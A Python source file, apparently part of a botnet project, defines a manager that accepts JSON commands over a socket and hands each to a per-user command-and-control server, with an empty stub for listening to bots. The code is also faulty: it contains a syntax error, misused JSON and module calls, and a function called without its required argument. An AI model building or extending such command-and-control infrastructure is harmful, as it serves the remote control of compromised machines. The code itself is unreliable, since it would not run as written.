import threading
import socket
import sys
import json

import Command
import C2server


class ServerManager():
    def __init__(self, command_entry_address, bot_entry_address):
        self.command_entry_address = command_entry_address
        self.bot_entry_address = bot_entry_address
        self.bot_clusters = {}
        self.commands_in_process = []
        self.c2servers = []

    def listen_for_commands(self):
        """
        Listen for incoming commands
        :return: None
        """
        try:
            commands_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            commands_socket.bind(self.command_entry_address)
            commands_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            commands_socket.listen()
        except:
            print("[-] Commands socket setup failed")
            sys.exit()

        while True:
            try:
                command_socket, command_address = commands_socket.accept()
            except:
                print("[-] Accepting command connection failed")
                break

            try:
                command = command_socket.recv(1024))
                command = json.load(command.decode())
                command = Command(**command)
            except:
                print("[-] Incoming command invalid")
                break

            self.commands_in_process.append(command)

            command_thread = threading.Thread(target=self.assign_command, args=(command_socket, command))
            command_thread.start()

    def assign_command(self, command_socket, command):
        # TODO: add verification of user_id (call to database?)

        c2server = None

        for c2server_i in self.c2servers:
            if c2server_i.user_id == command.userId:
                c2server = c2server_i
                break

        if c2server is not None:
            command_socket.sendall(b'Command was properly processed')
            c2server.execute_command(command)
        else:
            c2server = self.spawn_c2server()
            c2server.execute_command(command)

        command_socket.close()


    def listen_for_bots(self):
        """
        Listen for incoming bots
        :return: None
        """
        pass

    def spawn_c2server(self, user_id):
        """
        Spawn new C2 server when no available bot cluster is present
        :param user_id: str
        :return: C2server
        """
        c2server = C2server(user_id)
        self.c2servers.append(c2server)
        return c2server



if __name__ == "__main__":
    command_entry_address = ('', 4590)
    bot_entry_address = ('', 4591)
    serverManager = ServerManager(command_entry_address, bot_entry_address)
    command_thread = threading.Thread(target=serverManager.listen_for_commands)
    command_thread.start()
    bot_thread = threading.Thread(target=serverManager.listen_for_bots)
    bot_thread.start()


